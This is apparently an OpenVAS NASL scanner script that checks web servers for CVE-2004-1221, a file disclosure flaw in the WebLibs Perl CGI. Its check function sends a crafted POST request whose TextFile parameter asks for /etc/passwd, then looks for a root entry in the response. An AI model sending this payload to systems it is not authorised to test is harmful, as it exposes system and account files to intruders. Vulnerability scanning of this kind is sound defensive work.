# OpenVAS Vulnerability Test
# $Id: weblibs_file_inclusion.nasl 17 2013-10-27 14:01:43Z jan $
# Description: WebLibs File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running 'WebLibs', a CGI written in Perl.

Due to incorrect parsing of incoming data, an attacker can
cause the CGI to return arbitrary files as the result of the CGI.";

tag_solution = "Delete weblibs.pl";

# Remote Web Server Text File Viewing Vulnerability in WebLibs 1.0
# John Bissell <monkey321_1@hotmail.com>
# 2004-12-08 05:41

if(description)
{
 script_id(16168);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2004-1221");
 script_bugtraq_id(11848);
 
 name = "WebLibs File Disclosure";

 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Checks for the presence of a WebLibs File Disclosure";
 
 script_summary(summary);
 
 script_category(ACT_ATTACK);
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


function check(loc)
{
 req = string("POST ", loc, "/weblibs.pl HTTP/1.1\r\n",
              "Host: ", get_host_name(), ":", port, "\r\n",
	      "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041207 Firefox/1.0 (Debian package 1.0-5)\r\n",
	      "Content-Type: application/x-www-form-urlencoded\r\n",
	      "Content-Length: 372\r\n",
	      "\r\n",
	      "TextFile=%2Fetc%2Fpasswd&Adjective+%231=a&Adjective+%232=a&Adjective+%233=a&Adjective+%234=a&Adjective+%235=a&Highland+Games+such+as+Stone+Mountain=a&Man%27s+Name=a&Noun+%231=a&Noun+%232=a&Noun+%233=a&Noun+%234=a&Noun+%235=a&Noun+%236=a&Noun+%237=a&Noun+%238=a&Plural+Noun+%231=a&Plural+Noun+%232=a&Plural+Noun+%233=a&Plural+Noun+%234=a&Plural+Noun+%235=a&Woman%27s+Name=a");
 r = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
  security_warning(port);
  exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}

